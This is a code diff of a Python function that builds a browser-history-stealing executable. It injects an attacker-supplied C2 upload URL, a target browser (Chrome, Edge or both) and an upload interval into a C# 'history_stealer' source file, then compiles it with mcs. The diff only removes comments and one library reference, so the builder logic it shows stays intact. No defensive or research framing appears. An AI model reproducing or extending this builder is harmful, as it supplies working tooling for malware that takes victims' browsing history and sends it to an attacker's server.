@@ -19,12 +19,11 @@ def build_executable(exe_name, upload_url, target_browser, upload_interval, self
     Returns:
         tuple: (bool, str) - (Success status, Output filename or error message)
     """
-    base_dir = os.path.dirname(os.path.abspath(__file__))  # webapp directory
+    base_dir = os.path.dirname(os.path.abspath(__file__))
     source_file = os.path.join(base_dir, "..", "history_stealer", "Program.cs")
     temp_file = os.path.join(base_dir, f"Program_temp_{os.urandom(8).hex()}.cs")
     output_exe = os.path.join(base_dir, output_dir, exe_name)
 
-    # Validate inputs
     if not upload_url.startswith(("http://", "https://")):
         return False, "Upload URL must start with http:// or https://"
     if target_browser not in [0, 1, 2]:
@@ -34,21 +33,17 @@ def build_executable(exe_name, upload_url, target_browser, upload_interval, self
     if not os.path.exists(source_file):
         return False, f"Source file {source_file} not found"
 
-    # Map target_browser to string
     target_map = {0: "CHROME", 1: "EDGE", 2: "BOTH"}
     target = target_map[target_browser]
 
-    # Ensure output directory exists
     os.makedirs(os.path.join(base_dir, output_dir), exist_ok=True)
 
-    # Read the original Program.cs
     try:
         with open(source_file, "r") as f:
             content = f.read()
     except Exception as e:
         return False, f"Failed to read {source_file}: {str(e)}"
 
-    # Replace configuration values
     content = re.sub(
         r'public static readonly string C2Url = "[^"]*";',
         f'public static readonly string C2Url = "{upload_url}";',
@@ -70,14 +65,12 @@ def build_executable(exe_name, upload_url, target_browser, upload_interval, self
         content
     )
 
-    # Write modified content to temporary file
     try:
         with open(temp_file, "w") as f:
             f.write(content)
     except Exception as e:
         return False, f"Failed to write temporary file: {str(e)}"
 
-    # mcs command to compile
     mcs_command = [
         "mcs",
         "-sdk:4.5",
@@ -87,7 +80,6 @@ def build_executable(exe_name, upload_url, target_browser, upload_interval, self
         "-r:/usr/lib/mono/4.5/System.Net.Http.dll",
         "-r:/usr/lib/mono/4.5/System.IO.Compression.dll",
         "-r:/usr/lib/mono/4.5/System.IO.Compression.FileSystem.dll",
-        "-r:" + os.path.join(base_dir, "..", "history_stealer", "Newtonsoft.Json.dll"),
         "-langversion:7.1",
         temp_file
     ]
